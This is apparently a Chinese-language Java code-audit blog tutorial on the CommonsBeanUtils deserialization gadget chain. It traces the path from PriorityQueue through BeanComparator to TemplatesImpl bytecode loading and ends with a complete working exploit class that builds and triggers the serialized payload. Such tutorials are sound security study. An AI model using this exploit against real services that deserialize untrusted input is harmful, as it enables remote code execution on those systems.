---
title: CommonsBeanUtils反序列化
date: 2026-08-06 18:50:49
categories:
  - java代码审计
tags:
  - Java
  - 反序列化
  - Commons Collections
---

## CommonsBeanUtils反序列化

### 环境

jdk8不受环境影响

其余环境为

```java
<dependency>  
 <groupId>commons-beanutils</groupId>  
 <artifactId>commons-beanutils</artifactId>  
 <version>1.9.2</version>  
</dependency>  
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->  
<dependency>  
 <groupId>commons-collections</groupId>  
 <artifactId>commons-collections</artifactId>  
 <version>3.1</version>  
</dependency>  
<!-- https://mvnrepository.com/artifact/commons-logging/commons-logging -->  
<dependency>  
 <groupId>commons-logging</groupId>  
 <artifactId>commons-logging</artifactId>  
 <version>1.2</version>  
</dependency>
```

CommonsBeanUtils 这个包也可以操作 JavaBean，举例如下：

比如 Baby 是一个最简单的 JavaBean 类

```java
public class Baby {  
    private String name = "roxci";  
  
 public String getName(){  
        return name;  
 }  
  
    public void setName (String name) {  
        this.name = name;  
 }  
}
```

这里定义两个简单的 getter setter 方法，如果用 `@Lombok` 的注解也是同样的，使用 `@Lombok` 的注解不需要写 getter setter。

Commons-BeanUtils 中提供了一个静态方法 `PropertyUtils.getProperty` ，让使用者可以直接调用任意 JavaBean 的 getter 方法

### 分析链子

- 还是和之前一样，进行逆向分析。这里的链子和 CC4 的前半部分链子是基本一致的。

### 1. 链子尾部

我们链子的尾部是通过动态加载 TemplatesImpl 字节码的方式进行攻击的，原因很简单：

在之前讲动态加载 TemplatesImpl 字节码的时候，我们的链子是这样的

```java
TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->

TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()

-> TransletClassLoader#defineClass()
```

在链子的最开头 ———— `TemplatesImpl.getOutputProperties()`，它是一个 getter 方法，并且作用域为 public，所以可以通过 CommonsBeanUtils 中的 `PropertyUtils.getProperty()` 方式获取，

这里我们的 `PropertyUtils.getProperty()` 对应的参数应该这么传

```java
// 伪代码
PropertyUtils.getProperty(TemplatesImpl, outputProperties)
```

### 2. 中间链子

上一步我们说到尾部是 `PropertyUtils.getProperty()`，我们就去看看谁调用了 `PropertyUtils.getProperty()`

![image-20260806162925130](/images/java-code-audit/09-commonsbeanutils反序列化/20260806162925394.png)

这里的 compare() 方法比较符合条件，因为它经常被其他方法所调用，作为链子的一部分来说，我们是很喜欢这种方法的。

继续找谁调用了 compare() 方法，这里就太多了，我们优先去找能够进行序列化的类，于是这里找到了 `PriorityQueue` 这个类。

```java
PriorityQueue` 这个类的 `siftDownUsingComparator()` 方法调用了 `compare()
```

很明显就是cc4的前半段了

最终exp

```java
package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB {
    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("E:\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "Calc");
        setFieldValue(templates, "_bytecodes", new byte[][] {code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        //    templates.newTransformer();
        final BeanComparator beanComparator = new BeanComparator();
        // 创建新的队列，并添加恶意字节码
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(1);
        queue.add(1);

        // 将 property 的值赋为 outputProperties
        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});
        serialize(queue);
        unserialize("ser.bin");
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

